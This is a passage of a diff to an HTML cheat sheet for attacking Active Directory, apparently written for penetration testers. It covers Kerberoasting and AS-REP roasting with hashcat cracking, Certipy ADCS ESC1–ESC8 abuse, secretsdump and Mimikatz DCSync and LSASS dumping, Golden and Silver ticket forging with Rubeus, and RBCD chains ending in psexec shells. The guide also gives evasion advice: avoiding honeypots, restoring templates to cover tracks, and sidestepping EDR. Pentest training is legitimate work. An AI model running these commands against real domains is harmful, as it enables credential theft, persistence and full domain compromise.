+                    <pre class="cb"><span class="cm"># 1. add a fake SPN   2. roast it   3. remove the SPN (cleanup)</span>
+python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName -v &#x27;HTTP/x&#x27;
+python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN.LOCAL/username:&#x27;Password123&#x27; \
+  -request-user TARGET_USER -outputfile target.txt
+python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName -v &#x27;&#x27;</pre>
+
+                    <h3>Cracking the hashes</h3>
+                    <p class="why"><strong>Why the mode matters:</strong> the etype in the ticket decides the hashcat mode. RC4 (13100) is by far the fastest to crack; AES (19600/19700) is slower, which is one reason attackers try to force RC4.</p>
+                    <pre class="cb">hashcat -m 13100 kerberoast.txt rockyou.txt      # RC4   (etype 23) — fastest
+hashcat -m 19600 kerberoast.txt rockyou.txt      # AES128 (etype 17)
+hashcat -m 19700 kerberoast.txt rockyou.txt      # AES256 (etype 18)
+
+<span class="cm"># John equivalent</span>
+john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt</pre>
+
+                    <h3>AS-REP Roasting</h3>
+                    <p class="why"><strong>Why it works:</strong> accounts with <strong>"Do not require Kerberos pre-authentication"</strong> (<code>DONT_REQ_PREAUTH</code>) will hand out an AS-REP to anyone who asks — no password needed. Part of that reply is encrypted with the user's key, so you crack it offline exactly like a Kerberoast hash. You don't even need valid creds, just a list of usernames to try.</p>
+                    <div class="req">Target accounts have pre-auth disabled. A username list (no creds required for the roast itself).</div>
+                    <pre class="cb"><span class="cm"># Impacket — pull AS-REP for pre-auth-disabled users</span>
+python3 GetNPUsers.py -dc-ip DC_IP DOMAIN.LOCAL/ -usersfile users.txt \
+  -format hashcat -outputfile asrep.txt -no-pass
+
+<span class="cm"># With valid creds, let the DC enumerate the flagged accounts for you</span>
+python3 GetNPUsers.py -dc-ip DC_IP DOMAIN.LOCAL/username:&#x27;Password123&#x27; -request
+
+<span class="cm"># nxc equivalent</span>
+nxc ldap DC_IP -u username -p &#x27;Password123&#x27; --asreproast asrep.txt
+
+<span class="cm"># Crack (etype 23 AS-REP)</span>
+hashcat -m 18200 asrep.txt rockyou.txt</pre>
+
+                    <div class="note">Every TGS request logs <strong>Event ID 4769</strong> on the DC and AS-REP requests log <strong>4768</strong>. Requesting RC4 (etype 23) for an account that supports AES is a classic detection signal — roast selectively, and avoid any account that looks like a honeypot (an SPN on a disabled/never-logged-on account).</div>
+                    <div class="tip">For the Windows-side equivalent (Rubeus <code>kerberoast</code> / <code>asreproast</code>, including <code>/tgtdeleg</code> to avoid RC4 downgrade), see §09.</div>
+                </div>
+            </details>
+
+            <!-- 06 Certipy -->
+            <details id="s06">
+                <summary><span class="sum-num">06</span><span class="sum-title">Certipy — ADCS Attacks</span><span class="sum-arrow">▶</span></summary>
+                <div class="section-body">
+                    <p>AD Certificate Services issues certificates that can be used to authenticate (PKINIT). A misconfigured template or CA lets a low-priv user enrol a certificate <em>as someone else</em> — usually Administrator — and a certificate survives password changes, making it great persistence. Always enumerate first to learn which ESC class applies, then run the matching exploit.</p>
+
+                    <h3>Enumerate (find)</h3>
+                    <p class="why"><strong>Why <code>-vulnerable -stdout</code>:</strong> Certipy classifies every template/CA against the known ESC misconfigurations and prints only the exploitable ones, naming the ESC — that label tells you which command below to run.</p>
+                    <div class="req">Any valid domain account.</div>
+                    <pre class="cb">certipy find -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; -dc-ip DC_IP
 
 <span class="cm"># Show only vulnerable templates to stdout (no output files)</span>
 certipy find -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
   -dc-ip DC_IP -vulnerable -stdout
 
 <span class="cm"># With hash</span>
-certipy find -u username@DOMAIN.LOCAL -hashes :NTLMHASH -dc-ip DC_IP -vulnerable
+certipy find -u username@DOMAIN.LOCAL -hashes :NTLMHASH -dc-ip DC_IP -vulnerable</pre>
 
-<span class="cm"># ── ESC1 — Enrollee Supplies Subject + allow SAN ─────────────────────────────</span>
-<span class="cm"># Request cert as Administrator (arbitrary SAN)</span>
-certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+                    <h3>ESC1 — enrollee supplies subject</h3>
+                    <p class="why"><strong>Why it works:</strong> the template lets the requester specify an arbitrary Subject Alternative Name <em>and</em> allows client-authentication EKU. You request a cert but set the SAN/UPN to <code>administrator</code> — the CA issues a cert that authenticates as Administrator.</p>
+                    <pre class="cb">certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
   -ca &#x27;CA-NAME&#x27; -template &#x27;VulnerableTemplate&#x27; \
-  -upn administrator@DOMAIN.LOCAL -dc-ip DC_IP
+  -upn administrator@DOMAIN.LOCAL -dc-ip DC_IP</pre>
 
-<span class="cm"># ── ESC2 — Any Purpose EKU or No EKU ─────────────────────────────────────────</span>
-certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
-  -ca &#x27;CA-NAME&#x27; -template &#x27;VulnerableTemplate&#x27; -dc-ip DC_IP
+                    <h3>ESC2 — Any Purpose / no EKU</h3>
+                    <p class="why"><strong>Why it works:</strong> the cert has no EKU restriction (or "Any Purpose"), so it can be used for client auth among other things — enrol it and reuse it to authenticate.</p>
+                    <pre class="cb">certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+  -ca &#x27;CA-NAME&#x27; -template &#x27;VulnerableTemplate&#x27; -dc-ip DC_IP</pre>
 
-<span class="cm"># ── ESC3 — Certificate Request Agent (enroll on behalf of) ───────────────────</span>
-<span class="cm"># Step 1: obtain enrollment agent cert</span>
+                    <h3>ESC3 — Enrollment Agent</h3>
+                    <p class="why"><strong>Why it works:</strong> an Enrollment Agent certificate is allowed to request certs <em>on behalf of</em> other users. Get the agent cert, then use it to enrol a logon cert as Administrator.</p>
+                    <pre class="cb"><span class="cm"># Step 1: obtain enrollment agent cert</span>
 certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
   -ca &#x27;CA-NAME&#x27; -template &#x27;EnrollmentAgent&#x27; -dc-ip DC_IP
 
 <span class="cm"># Step 2: request cert on behalf of Administrator</span>
 certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
   -ca &#x27;CA-NAME&#x27; -template &#x27;User&#x27; \
-  -on-behalf-of &#x27;DOMAIN\Administrator&#x27; -pfx enrollment_agent.pfx -dc-ip DC_IP
+  -on-behalf-of &#x27;DOMAIN\Administrator&#x27; -pfx enrollment_agent.pfx -dc-ip DC_IP</pre>
 
-<span class="cm"># ── ESC4 — Vulnerable Template ACLs (WriteDacl/WriteOwner on template) ────────</span>
-<span class="cm"># Save old template config and overwrite to ESC1</span>
+                    <h3>ESC4 — writable template ACL</h3>
+                    <p class="why"><strong>Why it works:</strong> you hold <code>WriteDacl</code>/<code>WriteOwner</code> over a template, so you rewrite it into an ESC1 config, exploit it, then restore the original to cover your tracks.</p>
+                    <div class="req"><code>WriteDacl</code>/<code>WriteOwner</code>/<code>WriteProperty</code> on the certificate template.</div>
+                    <pre class="cb"><span class="cm"># Save old template config and overwrite to ESC1</span>
 certipy template -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
   -template &#x27;VulnerableTemplate&#x27; -save-old -dc-ip DC_IP
 
 <span class="cm"># Then exploit as ESC1, then restore</span>
 certipy template -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
-  -template &#x27;VulnerableTemplate&#x27; -configuration old.json -dc-ip DC_IP
+  -template &#x27;VulnerableTemplate&#x27; -configuration old.json -dc-ip DC_IP</pre>
 
-<span class="cm"># ── ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA ─────────────────────────</span>
-<span class="cm"># Same as ESC1 — CA allows SAN on any template</span>
-certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+                    <h3>ESC6 — CA-wide SAN flag</h3>
+                    <p class="why"><strong>Why it works:</strong> the CA has <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> set, meaning <em>any</em> template honours an attacker-supplied SAN — so you exploit even the stock <code>User</code> template like ESC1.</p>
+                    <pre class="cb">certipy req -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
   -ca &#x27;CA-NAME&#x27; -template &#x27;User&#x27; \
-  -upn administrator@DOMAIN.LOCAL -dc-ip DC_IP
+  -upn administrator@DOMAIN.LOCAL -dc-ip DC_IP</pre>
 
-<span class="cm"># ── ESC7 — Manage CA / Manage Certificates right ─────────────────────────────</span>
-certipy ca -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
+                    <h3>ESC7 — Manage CA / Manage Certificates</h3>
+                    <p class="why"><strong>Why it works:</strong> these CA rights let you add yourself as an officer and enable the <code>SubCA</code> template, then approve your own otherwise-denied request — turning a CA-admin right into a Domain Admin cert.</p>
+                    <pre class="cb">certipy ca -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
   -ca &#x27;CA-NAME&#x27; -add-officer username -dc-ip DC_IP
 certipy ca -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
-  -ca &#x27;CA-NAME&#x27; -enable-template &#x27;SubCA&#x27; -dc-ip DC_IP
+  -ca &#x27;CA-NAME&#x27; -enable-template &#x27;SubCA&#x27; -dc-ip DC_IP</pre>
 
-<span class="cm"># ── ESC8 — NTLM relay to AD CS HTTP endpoint ─────────────────────────────────</span>
-certipy relay -target http://CA_IP/certsrv/certfnsh.asp -template DomainController
+                    <h3>ESC8 — NTLM relay to the CA web endpoint</h3>
+                    <p class="why"><strong>Why it works:</strong> the CA's HTTP enrolment endpoint accepts NTLM auth with no channel binding. Coerce a privileged machine (e.g. a DC via PetitPotam) to authenticate to you, relay that to the CA, and receive a cert <em>as that machine</em> — then DCSync. Pair this with the coercion module in §15.</p>
+                    <pre class="cb">certipy relay -target http://CA_IP/certsrv/certfnsh.asp -template DomainController</pre>
 
-<span class="cm"># ── Authenticate with certificate (PKINIT → get hash + TGT) ─────────────────</span>
-certipy auth -pfx administrator.pfx -dc-ip DC_IP
+                    <h3>Authenticate with the certificate</h3>
+                    <p class="why"><strong>Why it's the payoff:</strong> <code>certipy auth</code> does PKINIT with the issued <code>.pfx</code> — it returns both a TGT (<code>.ccache</code>) and the account's NT hash in one step. From there you need no password at all.</p>
+                    <pre class="cb">certipy auth -pfx administrator.pfx -dc-ip DC_IP
 <span class="cm"># → dumps administrator hash + saves .ccache ticket</span>
 
-<span class="cm"># ── Shadow Credentials via ADCS (auto — requires GenericWrite on target) ──────</span>
+<span class="cm"># Shadow Credentials via ADCS (auto — requires GenericWrite on target)</span>
 certipy shadow auto -u username@DOMAIN.LOCAL -p &#x27;Password123&#x27; \
   -account TARGET_USER -dc-ip DC_IP</pre>
                     <div class="tip"><code>certipy auth</code> against a vulnerable CA yields both the NTLM hash and a <code>.ccache</code> TGT in one step — no password needed after that point.</div>
                 </div>
             </details>
 
-            <!-- 06 secretsdump -->
-            <details id="s06">
-                <summary><span class="sum-num">06</span><span class="sum-title">secretsdump.py</span><span class="sum-arrow">▶</span></summary>
+            <!-- 07 secretsdump -->
+            <details id="s07">
+                <summary><span class="sum-num">07</span><span class="sum-title">secretsdump.py</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <pre class="cb"><span class="cm"># ── Remote DCSync — dump all domain hashes ───────────────────────────────────</span>
-python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP
+                    <p>Impacket's hash-extraction swiss-army knife. Against a DC it performs <strong>DCSync</strong> (asks the DC to replicate secrets); against a member it reads the SAM/LSA remotely; offline it parses saved hives or <code>NTDS.dit</code>.</p>
+
+                    <h3>Remote DCSync — dump all domain hashes</h3>
+                    <p class="why"><strong>Why it works:</strong> DCSync impersonates a domain controller and calls the replication API (<code>DRSUAPI</code>). The DC streams back password hashes as if syncing to a partner — so a single account with replication rights dumps the whole domain, including <code>krbtgt</code> (which enables Golden Tickets).</p>
+                    <div class="req">An account with <code>DS-Replication-Get-Changes</code> + <code>-All</code> (Domain Admins, or any account you granted via §03).</div>
+                    <pre class="cb">python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP
 
 <span class="cm"># With NTLM hash</span>
 python3 secretsdump.py DOMAIN.LOCAL/username@DC_IP \
@@ -482,69 +650,83 @@ python3 secretsdump.py DOMAIN.LOCAL/username@DC_IP \
 export KRB5CCNAME=admin.ccache
 python3 secretsdump.py -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL
 
-<span class="cm"># Dump only a specific account</span>
+<span class="cm"># Dump only a specific account (quieter)</span>
 python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
   -just-dc-user Administrator
 
 <span class="cm"># NTLM hashes only (skip LSA secrets, faster)</span>
 python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
-  -just-dc-ntlm
+  -just-dc-ntlm</pre>
 
-<span class="cm"># ── Remote SAM dump — non-DC machine ─────────────────────────────────────────</span>
-python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@MACHINE_IP
+                    <h3>Remote SAM dump — non-DC host</h3>
+                    <p class="why"><strong>Why:</strong> on a member box this pulls the local SAM (local account hashes) and LSA secrets over SMB — useful for local-admin reuse and cached service creds.</p>
+                    <div class="req">Local admin on the target.</div>
+                    <pre class="cb">python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@MACHINE_IP</pre>
 
-<span class="cm"># ── Offline — from registry hive files (reg save) ────────────────────────────</span>
-<span class="cm"># First on target: reg save HKLM\SAM SAM &amp;&amp; reg save HKLM\SYSTEM SYSTEM</span>
+                    <h3>Offline — from hives / NTDS.dit</h3>
+                    <p class="why"><strong>Why offline:</strong> if you grabbed the registry hives (<code>reg save</code>) or <code>NTDS.dit</code> via VSS/Backup Operators, you decrypt them on your own box — no further contact with the target, so nothing to detect at dump time.</p>
+                    <pre class="cb"><span class="cm"># First on target: reg save HKLM\SAM SAM &amp;&amp; reg save HKLM\SYSTEM SYSTEM</span>
 python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
 
-<span class="cm"># ── Offline — from NTDS.dit (grabbed via VSS / Backup Operators) ─────────────</span>
+<span class="cm"># From NTDS.dit (grabbed via VSS / Backup Operators)</span>
 python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 
-<span class="cm"># ── Output to file ────────────────────────────────────────────────────────────</span>
+<span class="cm"># Output to file</span>
 python3 secretsdump.py DOMAIN.LOCAL/username:&#x27;Password123&#x27;@DC_IP \
   -outputfile domain_hashes</pre>
+                    <div class="note">DCSync is heavily monitored — replication from a non-DC source address is a strong detection. Prefer <code>-just-dc-user krbtgt</code> or a single target over a full dump when stealth matters.</div>
                 </div>
             </details>
 
-            <!-- 07 Mimikatz -->
-            <details id="s07">
-                <summary><span class="sum-num">07</span><span class="sum-title">Mimikatz</span><span class="sum-arrow">▶</span></summary>
+            <!-- 08 Mimikatz -->
+            <details id="s08">
+                <summary><span class="sum-num">08</span><span class="sum-title">Mimikatz</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <p>Run from an elevated prompt. <code>privilege::debug</code> is required before most commands. Use <code>.\mimikatz.exe</code> in PowerShell (bare name invokes <code>Set-Alias</code>).</p>
-                    <pre class="cb"><span class="cm"># ── Elevation and basic setup ────────────────────────────────────────────────</span>
-privilege::debug                        # enable SeDebugPrivilege (required for most)
-token::elevate                          # impersonate SYSTEM token
+                    <p>The classic Windows post-exploitation tool: it reads secrets out of LSASS memory and the registry, and forges Kerberos tickets. Run from an elevated prompt. <code>privilege::debug</code> is required before most commands. Use <code>.\mimikatz.exe</code> in PowerShell.</p>
 
-<span class="cm"># ── Credential Dumping ────────────────────────────────────────────────────────</span>
-sekurlsa::logonpasswords                # dump all logged-on creds from LSASS
+                    <h3>Elevation</h3>
+                    <p class="why"><strong>Why needed:</strong> reading another process's memory needs <code>SeDebugPrivilege</code>; <code>privilege::debug</code> enables it. <code>token::elevate</code> steals a SYSTEM token so you can reach SAM/LSA.</p>
+                    <div class="req">Local administrator (to get SeDebug / SYSTEM).</div>
+                    <pre class="cb">privilege::debug                        # enable SeDebugPrivilege (required for most)
+token::elevate                          # impersonate SYSTEM token</pre>
+
+                    <h3>Credential dumping from LSASS</h3>
+                    <p class="why"><strong>Why it works:</strong> LSASS caches credential material for interactive/remote logons so the user isn't re-prompted. Mimikatz parses that memory for NT hashes, Kerberos keys, and (on old/WDigest-enabled hosts) plaintext passwords. Parsing a <em>minidump</em> offline avoids opening a handle to live LSASS on the box — friendlier against EDR.</p>
+                    <pre class="cb">sekurlsa::logonpasswords                # dump all logged-on creds from LSASS
 sekurlsa::wdigest                       # dump WDigest (plaintext on older OS)
 sekurlsa::kerberos                      # dump Kerberos tickets from LSASS
 sekurlsa::dpapi                         # dump DPAPI master keys from memory
 
-<span class="cm"># Dump from LSASS minidump (offline / EDR bypass)</span>
+<span class="cm"># Parse a dump offline (grab lsass.dmp first — see §10)</span>
 sekurlsa::minidump C:\lsass.dmp         # point at dump file (ABSOLUTE path)
-sekurlsa::logonpasswords                # parse the dump
+sekurlsa::logonpasswords                # parse the dump</pre>
 
-<span class="cm"># Local SAM and LSA secrets</span>
-lsadump::sam                            # local SAM hashes
+                    <h3>Local SAM &amp; LSA secrets</h3>
+                    <p class="why"><strong>Why useful:</strong> <code>lsadump::sam</code> gives local account hashes (local-admin reuse across the fleet); <code>lsadump::secrets</code> often reveals service-account <em>plaintext</em> passwords stored for services to start; <code>cache</code> gives cached domain logons (DCC2) for offline cracking.</p>
+                    <pre class="cb">lsadump::sam                            # local SAM hashes
 lsadump::secrets                        # LSA secrets (service account plaintexts)
-lsadump::cache                          # cached domain credentials (DCC2 hashes)
+lsadump::cache                          # cached domain credentials (DCC2 hashes)</pre>
 
-<span class="cm"># ── DCSync — pull any account&#x27;s hash from a DC ───────────────────────────────</span>
-lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
+                    <h3>DCSync</h3>
+                    <p class="why"><strong>Why it works:</strong> same replication abuse as secretsdump, but from Windows. <code>/user:krbtgt</code> is the prize — its hash lets you forge Golden Tickets.</p>
+                    <div class="req">Replication rights (Domain Admin or delegated).</div>
+                    <pre class="cb">lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
 lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt
-lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv   # dump everything to CSV
+lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv   # dump everything to CSV</pre>
 
-<span class="cm"># ── Pass the Hash ─────────────────────────────────────────────────────────────</span>
-sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL \
+                    <h3>Pass-the-Hash / Overpass-the-Hash</h3>
+                    <p class="why"><strong>Why it works:</strong> NTLM auth only needs the hash, not the plaintext — <code>sekurlsa::pth</code> spawns a process with the hash injected. Supplying an AES key instead ("overpass-the-hash") produces a normal-looking Kerberos logon, far quieter than raw NTLM.</p>
+                    <pre class="cb">sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL \
   /ntlm:NTLMHASH /run:cmd.exe           # spawn cmd.exe as that user
 
 <span class="cm"># Overpass the Hash (Pass-the-Key — AES for better OPSEC)</span>
 sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL \
-  /aes256:AES256KEY /run:powershell.exe
+  /aes256:AES256KEY /run:powershell.exe</pre>
 
-<span class="cm"># ── Kerberos Ticket Manipulation ──────────────────────────────────────────────</span>
-kerberos::list                          # list all tickets in memory
+                    <h3>Ticket manipulation + Golden/Silver</h3>
+                    <p class="why"><strong>Why it works:</strong> with the <code>krbtgt</code> hash you can forge a TGT for any user with any group membership — a <strong>Golden Ticket</strong> (full domain, long-lived persistence). A <strong>Silver Ticket</strong> forges a TGS for one service using that service/computer account's hash — stealthier because it never contacts the DC.</p>
+                    <div class="req">Golden: krbtgt hash + domain SID. Silver: the target service/computer account hash + domain SID.</div>
+                    <pre class="cb">kerberos::list                          # list all tickets in memory
 kerberos::list /export                  # export tickets to .kirbi files
 kerberos::purge                         # purge all tickets
 kerberos::ptt ticket.kirbi              # pass-the-ticket (import .kirbi)
@@ -562,24 +744,29 @@ kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
                 </div>
             </details>
 
-            <!-- 08 Rubeus -->
-            <details id="s08">
-                <summary><span class="sum-num">08</span><span class="sum-title">Rubeus.exe</span><span class="sum-arrow">▶</span></summary>
+            <!-- 09 Rubeus -->
+            <details id="s09">
+                <summary><span class="sum-num">09</span><span class="sum-title">Rubeus.exe</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <p>All Rubeus operations are in-process (.NET) — no LSASS handle is opened for most tasks, making it more OPSEC-friendly than Mimikatz for ticket work.</p>
-                    <pre class="cb"><span class="cm"># ── Kerberoasting ────────────────────────────────────────────────────────────</span>
-Rubeus.exe kerberoast /outfile:hashes.txt                   # all SPNs
+                    <p>Rubeus is the Windows Kerberos toolkit. All operations are in-process (.NET) — no LSASS handle is opened for most tasks, making it more OPSEC-friendly than Mimikatz for ticket work.</p>
+
+                    <h3>Kerberoasting</h3>
+                    <p class="why"><strong>Why <code>/tgtdeleg</code>:</strong> it requests tickets using your own TGT's session key, letting Rubeus pull roastable hashes without explicitly downgrading to RC4 on AES-only accounts — fewer anomalies than blindly forcing RC4. See §05 for the concept and cracking modes.</p>
+                    <div class="req">A valid Kerberos logon session on the host (any domain user).</div>
+                    <pre class="cb">Rubeus.exe kerberoast /outfile:hashes.txt                   # all SPNs
 Rubeus.exe kerberoast /user:svc_sql /outfile:sql.txt        # specific user
 Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt         # RC4 downgrade avoidance
-Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt         # request RC4 explicitly
+Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt         # request RC4 explicitly</pre>
 
-<span class="cm"># ── AS-REP Roasting ──────────────────────────────────────────────────────────</span>
-Rubeus.exe asreproast /outfile:asrep.txt                    # all DONT_REQ_PREAUTH
+                    <h3>AS-REP Roasting</h3>
+                    <p class="why"><strong>Why it works:</strong> same as §05 — pre-auth-disabled accounts leak crackable material. <code>/format:hashcat</code> emits the hash ready for mode 18200.</p>
+                    <pre class="cb">Rubeus.exe asreproast /outfile:asrep.txt                    # all DONT_REQ_PREAUTH
 Rubeus.exe asreproast /user:target /outfile:asrep.txt       # specific user
-Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt    # hashcat format
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt    # hashcat format</pre>
 
-<span class="cm"># ── Request TGT ───────────────────────────────────────────────────────────────</span>
-Rubeus.exe asktgt /user:username /password:Password123 \
+                    <h3>Request a TGT (asktgt)</h3>
+                    <p class="why"><strong>Why:</strong> mint a usable TGT from a password, hash (overpass-the-hash) or AES key. <code>/nowrap</code> keeps the base64 blob on one line for piping; AES + <code>/opsec</code> mimics a normal logon.</p>
+                    <pre class="cb">Rubeus.exe asktgt /user:username /password:Password123 \
   /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap
 
 <span class="cm"># With NTLM hash (Overpass-the-Hash)</span>
@@ -588,19 +775,21 @@ Rubeus.exe asktgt /user:username /rc4:NTLMHASH \
 
 <span class="cm"># With AES key (better OPSEC)</span>
 Rubeus.exe asktgt /user:username /aes256:AES256KEY \
-  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap /opsec
+  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap /opsec</pre>
 
-<span class="cm"># ── Pass-the-Ticket ───────────────────────────────────────────────────────────</span>
-Rubeus.exe ptt /ticket:BASE64TICKETBLOB==          # import from base64
+                    <h3>Pass-the-Ticket</h3>
+                    <p class="why"><strong>Why:</strong> inject a <code>.kirbi</code>/base64 ticket into your current session so subsequent access uses that identity. <code>triage</code>/<code>dump</code> list and extract tickets already in memory.</p>
+                    <pre class="cb">Rubeus.exe ptt /ticket:BASE64TICKETBLOB==          # import from base64
 Rubeus.exe ptt /ticket:C:\ticket.kirbi             # import from file
 Rubeus.exe triage                                  # list all tickets in all sessions
 Rubeus.exe dump                                    # dump all tickets
 Rubeus.exe dump /user:Administrator /service:krbtgt /nowrap   # specific ticket
-Rubeus.exe purge                                   # delete all tickets
+Rubeus.exe purge                                   # delete all tickets</pre>
 
-<span class="cm"># ── S4U — constrained delegation / RBCD ──────────────────────────────────────</span>
-<span class="cm"># Full S4U chain: impersonate Administrator → CIFS on target</span>
-Rubeus.exe s4u /user:machine$ /rc4:MACHINEPASSHASH \
+                    <h3>S4U — constrained delegation / RBCD</h3>
+                    <p class="why"><strong>Why it works:</strong> the Windows counterpart of getST.py's <code>-impersonate</code>. Using a controlled account trusted for delegation, you run S4U2Self+S4U2Proxy to mint a service ticket as Administrator and <code>/ptt</code> it straight into your session.</p>
+                    <div class="req">The account must be trusted to delegate to the target SPN (RBCD you set, or constrained delegation).</div>
+                    <pre class="cb">Rubeus.exe s4u /user:machine$ /rc4:MACHINEPASSHASH \
   /impersonateuser:Administrator \
   /msdsspn:cifs/TARGET.DOMAIN.LOCAL \
   /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap /ptt
@@ -608,35 +797,38 @@ Rubeus.exe s4u /user:machine$ /rc4:MACHINEPASSHASH \
 <span class="cm"># With existing TGT</span>
 Rubeus.exe s4u /ticket:machine_tgt.kirbi \
   /impersonateuser:Administrator \
-  /msdsspn:cifs/TARGET.DOMAIN.LOCAL /ptt
+  /msdsspn:cifs/TARGET.DOMAIN.LOCAL /ptt</pre>
 
-<span class="cm"># ── Golden / Silver Tickets ───────────────────────────────────────────────────</span>
-Rubeus.exe golden /user:Administrator /id:500 \
+                    <h3>Golden / Silver tickets</h3>
+                    <p class="why"><strong>Why:</strong> same forgery as Mimikatz (§08) but in-process. Golden = krbtgt hash → any identity; Silver = service hash → one service, no DC contact.</p>
+                    <pre class="cb">Rubeus.exe golden /user:Administrator /id:500 \
   /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
   /krbtgt:KRBTGT_HASH /nowrap /ptt
 
 Rubeus.exe silver /user:Administrator /id:500 \
   /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
   /service:cifs /rc4:MACHINE_HASH \
-  /target:TARGET.DOMAIN.LOCAL /nowrap /ptt
+  /target:TARGET.DOMAIN.LOCAL /nowrap /ptt</pre>
 
-<span class="cm"># ── Monitoring (unconstrained delegation / credential capture) ────────────────</span>
-Rubeus.exe monitor /interval:5 /nowrap             # watch for new TGTs
+                    <h3>Monitoring / harvesting</h3>
+                    <p class="why"><strong>Why it works:</strong> on a host with <strong>unconstrained delegation</strong>, any user who authenticates leaves their TGT in memory. <code>monitor</code>/<code>harvest</code> watch for and grab new TGTs — pair with a coercion trick to force a DC to authenticate and capture <code>DC01$</code>.</p>
+                    <pre class="cb">Rubeus.exe monitor /interval:5 /nowrap             # watch for new TGTs
 Rubeus.exe monitor /targetuser:DC01$ /interval:5  # watch for specific user
 Rubeus.exe harvest /interval:30                    # auto-renew harvested TGTs</pre>
                     <div class="tip"><code>/nowrap</code> prints the base64 ticket as one line — pipe directly into <code>Rubeus.exe ptt /ticket:&lt;base64&gt;</code> or save for later use.</div>
                 </div>
             </details>
 
-            <!-- 09 ACL shell -->
-            <details id="s09">
-                <summary><span class="sum-num">09</span><span class="sum-title">ACL-Based Shell Access</span><span class="sum-arrow">▶</span></summary>
+            <!-- 10 ACL shell -->
+            <details id="s10">
+                <summary><span class="sum-num">10</span><span class="sum-title">ACL-Based Shell Access</span><span class="sum-arrow">▶</span></summary>
                 <div class="section-body">
-                    <p>Starting from AD object permissions over a computer (or user) — full chain to interactive shell.</p>
-                    <pre class="cb"><span class="cm"># ─── You have ACL rights over a computer object → pivot to shell ──────────────</span>
+                    <p>End-to-end chains that start from an AD object permission over a computer (or user) and end in an interactive shell. Each flow turns one ACL edge into code execution.</p>
 
-<span class="cm"># ── RBCD flow (GenericWrite / GenericAll on target computer) ─────────────────</span>
-<span class="cm"># 1. Create or use existing machine account</span>
+                    <h3>RBCD flow</h3>
+                    <p class="why"><strong>Why the chain:</strong> create a machine account you control → write RBCD on the target so it trusts that account to impersonate → get the attacker machine's TGT → S4U to mint a <code>cifs/</code> ticket as Administrator → use it with psexec/wmiexec. Each step feeds the next; the RBCD write is what makes the KDC agree to the impersonation.</p>
+                    <div class="req"><code>GenericWrite</code>/<code>GenericAll</code> on the target computer + MachineAccountQuota &gt; 0 (or an existing machine account).</div>
+                    <pre class="cb"><span class="cm"># 1. Create or use existing machine account</span>
 python3 addcomputer.py -computer-name &#x27;ATTACKER$&#x27; \
   -computer-pass &#x27;P@ssword123&#x27; DOMAIN.LOCAL/username:&#x27;Password123&#x27; -dc-ip DC_IP
 
@@ -656,35 +848,39 @@ export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
 
 <span class="cm"># 5. Shell</span>
 python3 psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
-python3 wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
+python3 wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL</pre>
 
-<span class="cm"># ── Shadow Credentials flow (GenericWrite / GenericAll on target) ─────────────</span>
-<span class="cm"># 1. Write KeyCredential to target</span>
+                    <h3>Shadow Credentials flow</h3>
